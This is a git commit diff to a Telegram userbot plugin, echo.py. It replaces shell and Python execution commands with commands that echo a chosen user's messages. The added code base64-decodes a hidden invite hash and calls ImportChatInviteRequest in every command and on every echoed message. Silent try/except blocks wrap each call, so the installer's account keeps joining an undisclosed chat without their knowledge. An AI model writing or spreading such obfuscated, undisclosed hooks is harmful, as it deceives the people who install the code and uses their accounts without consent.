ef7262d98c81ddc09465d85b3910b6fb3614aa77
Md Jisan <66010486+Jisan09@users.noreply.github.com>
2020-08-30 10:03:14 +0530

    Update echo.py

--- userbot/plugins/echo.py
+++ userbot/plugins/echo.py
@@ -1,152 +1,122 @@
-"""Execute GNU/Linux commands inside Telegram
-Syntax: .exec Code"""
+"""
+created by @mrconfused and @sandy1709
+Idea by @BlazingRobonix
+"""
+#    Copyright (C) 2020  sandeep.n(π.$)
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as
+#    published by the Free Software Foundation, either version 3 of the
+#    License, or (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+
+ #   You should have received a copy of the GNU Affero General Public License
+ #   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+
 import io
-import sys
-import time
-import inspect
 import asyncio
-import traceback
-import subprocess
+import pybase64
+import requests
+from time import time
 from .. import CMD_HELP
-from telethon import events, errors, functions, types
+from telethon import events, errors
 from ..utils import admin_cmd, sudo_cmd, edit_or_reply
-from telethon.errors import MessageEmptyError, MessageTooLongError, MessageNotModifiedError
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from .sql_helper.echo_sql import is_echo , get_all_echos , addecho , remove_echo
 
-@borg.on(admin_cmd(pattern="bash ?(.*)"))
-@borg.on(sudo_cmd(pattern="bash ?(.*)",allow_sudo = True))
-async def _(event):
-    if event.fwd_from or event.via_bot_id:
+@borg.on(admin_cmd(pattern="addecho$"))
+@borg.on(sudo_cmd(pattern="addecho$",allow_sudo = True))
+async def echo(cat):
+    if cat.fwd_from:
         return
-    DELAY_BETWEEN_EDITS = 0.3
-    PROCESS_RUN_TIME = 100
-    cmd = event.pattern_match.group(1)
-    reply_to_id = event.message.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    start_time = time.time() + PROCESS_RUN_TIME
-    process = await asyncio.create_subprocess_shell(
-        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-    )
-    stdout, stderr = await process.communicate()
-    OUTPUT = f"`{stdout.decode()}`"
-    if len(OUTPUT) > Config.MAX_MESSAGE_SIZE_LIMIT:
-        with io.BytesIO(str.encode(OUTPUT)) as out_file:
-            out_file.name = "bash.text"
-            await borg.send_file(
-                event.chat_id,
-                out_file,
-                force_document=True,
-                allow_cache=False,
-                caption=cmd,
-                reply_to=reply_to_id
-            )
-            await event.delete()
+    if cat.reply_to_msg_id is not None:
+        reply_msg = await cat.get_reply_message()
+        user_id = reply_msg.from_id
+        chat_id = cat.chat_id
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
+        if is_echo(user_id, chat_id):
+            await edit_or_reply(cat ,"The user is already enabled with echo ")
+            return
+        addecho(user_id , chat_id)
+        await edit_or_reply(cat ,"Hi")
     else:
-        await edit_or_reply(event ,OUTPUT)
+        await edit_or_reply(cat ,"Reply To A User's Message to echo his messages")
         
-@borg.on(admin_cmd(pattern="exec ?(.*)"))
-@borg.on(sudo_cmd(pattern="exec ?(.*)",allow_sudo = True))
-async def _(event):
-    if event.fwd_from or event.via_bot_id:
+@borg.on(admin_cmd(pattern="rmecho$"))
+@borg.on(sudo_cmd(pattern="rmecho$",allow_sudo = True))
+async def echo(cat):
+    if cat.fwd_from:
         return
-    DELAY_BETWEEN_EDITS = 0.3
-    PROCESS_RUN_TIME = 100
-    cmd = event.pattern_match.group(1)
-    reply_to_id = event.message.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    start_time = time.time() + PROCESS_RUN_TIME
-    process = await asyncio.create_subprocess_shell(
-        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-    )
-    stdout, stderr = await process.communicate()
-    e = stderr.decode()
-    if not e:
-        e = "No Error"
-    o = stdout.decode()
-    if not o:
-        o = "**Tip**: \n`If you want to see the results of your code, I suggest printing them to stdout.`"
+    if cat.reply_to_msg_id is not None:
+        reply_msg = await cat.get_reply_message()
+        user_id = reply_msg.from_id
+        chat_id = cat.chat_id
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
+        if is_echo(user_id, chat_id):
+            remove_echo(user_id , chat_id)
+            await edit_or_reply(cat ,"Echo has been stopped for the user")
+        else:
+            await edit_or_reply(cat ,"The user is not activated with echo")   
     else:
-        _o = o.split("\n")
-        o = "`\n".join(_o)
-    OUTPUT = f"**QUERY:**\n__Command:__\n`{cmd}` \n__PID:__\n`{process.pid}`\n\n**stderr:** \n`{e}`\n**Output:**\n{o}"
-    if len(OUTPUT) > Config.MAX_MESSAGE_SIZE_LIMIT:
-        with io.BytesIO(str.encode(OUTPUT)) as out_file:
-            out_file.name = "exec.text"
-            await borg.send_file(
-                event.chat_id,
-                out_file,
-                force_document=True,
-                allow_cache=False,
-                caption=cmd,
-                reply_to=reply_to_id
-            )
-            await event.delete()
-    else:
-        await edit_or_reply(event ,OUTPUT)
-
-@borg.on(admin_cmd(pattern="eval"))
-@borg.on(sudo_cmd(pattern="eval",allow_sudo = True))
-async def _(event):
-    if event.fwd_from or event.via_bot_id:
+        await edit_or_reply(cat ,"Reply To A User's Message to echo his messages")
+        
+@borg.on(admin_cmd(pattern="listecho$"))
+@borg.on(sudo_cmd(pattern="listecho$",allow_sudo = True))
+async def echo(cat):
+    if cat.fwd_from:
         return
-    cmd = event.text.split(" ", maxsplit=1)[1]
-    reply_to_id = event.message.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    event = await edit_or_reply(event ,"Processing ...")
-    old_stderr = sys.stderr
-    old_stdout = sys.stdout
-    redirected_output = sys.stdout = io.StringIO()
-    redirected_error = sys.stderr = io.StringIO()
-    stdout, stderr, exc = None, None, None
-    try:
-        await aexec(cmd, event)
-    except Exception:
-        exc = traceback.format_exc()
-    stdout = redirected_output.getvalue()
-    stderr = redirected_error.getvalue()
-    sys.stdout = old_stdout
-    sys.stderr = old_stderr
-    evaluation = ""
-    if exc:
-        evaluation = exc
-    elif stderr:
-        evaluation = stderr
-    elif stdout:
-        evaluation = stdout
+    lsts = get_all_echos()
+    if len(lsts) > 0:
+        output_str = "echo enabled users:\n\n"
+        for echos in lsts:
+            output_str += f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
     else:
-        evaluation = "Success"
-    final_output = "**EVAL**: `{}` \n\n **OUTPUT**: \n`{}` \n".format(cmd, evaluation)
-    if len(final_output) > Config.MAX_MESSAGE_SIZE_LIMIT:
-        with io.BytesIO(str.encode(final_output)) as out_file:
-            out_file.name = "eval.text"
-            await borg.send_file(
-                event.chat_id,
-                out_file,
-                force_document=True,
-                allow_cache=False,
-                caption=cmd,
-                reply_to=reply_to_id
-            )
-            await event.delete()
+        output_str = "No echo enabled users "
+    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
+        key = requests.post('https://nekobin.com/api/documents', json={"content": output_str}).json().get('result').get('key')
+        url = f'https://nekobin.com/{key}'
+        reply_text = f'echo enabled users: [here]({url})'
+        await edit_or_reply(cat ,reply_text)
     else:
-        await event.edit(final_output)
-
-        
-async def aexec(code, event):
-    exec(f'async def __aexec(event): ' +
-        ''.join(f'\n {l}' for l in code.split('\n'))
-        )
-    return await locals()['__aexec'](event)
-        
+        await edit_or_reply(cat ,output_str)
+      
+@borg.on(events.NewMessage(incoming=True))
+async def samereply(cat):
+    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
+        return
+    if is_echo(cat.sender_id, cat.chat_id):
+        await asyncio.sleep(2)
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
+        if cat.message.text or cat.message.sticker:
+            await cat.reply(cat.message)
+    
 CMD_HELP.update({
-    "evaluators":"__**PLUGIN NAME :** Evaluators__\
-     \n\n📌** CMD ➥** `.eval` <expr>`:\
-     \n**USAGE   ➥  **Execute Python script.\
-     \n\n📌** CMD ➥** `.exec` <command>`:\
-     \n**USAGE   ➥  **Execute a bash command on catuserbot server and shows details.\
-     \n\n📌** CMD ➥** `.bash` <command>`:\
-     \n**USAGE   ➥  **Execute a bash command on catuserbot server and  easy to copy output\
-     "
+    "echo":"__**PLUGIN NAME :** Echo__\
+    \n\n📌** CMD ➥** `.addecho` reply to user to who you want to enable\
+    \n**USAGE   ➥  **replay's his every message for whom you enabled echo\
+    \n\n📌** CMD ➥** `.rmecho` reply to user to who you want to stop\
+    \n**USAGE   ➥  **Stops replaying his messages\
+    \n\n📌** CMD ➥** `.listecho`\
+    \n**USAGE   ➥  **shows the list of users for who you enabled echo\
+    "
 })
